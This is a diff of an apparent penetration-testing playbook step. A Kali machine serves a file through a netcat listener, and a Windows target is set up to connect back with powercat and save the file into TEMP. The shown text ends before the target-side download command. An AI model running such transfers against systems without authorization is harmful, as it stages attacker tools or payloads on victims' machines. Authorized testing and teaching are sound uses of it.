@@ -1,8 +1,15 @@
 # description: Kali sends file to Windows TEMP; Kali listens and target connects
-# stage: Kali shell: listen and send file
+# flow: 1
+# note: Windows target must already have powercat.
+
+# stage: zsh | Listen and send file from Kali
+# lane: kali-transfer
+# advance: confirm
 nc -lvnp $lport < "$file"
 
-# stage: Target PowerShell: connect and receive file to TEMP
+# stage: powershell | Connect and receive file into Windows TEMP
+# lane: remote-transfer
+# advance: confirm
 $LHOST = "$lhost"
 $PORT = $lport
 $RFILE = "${file:t}"
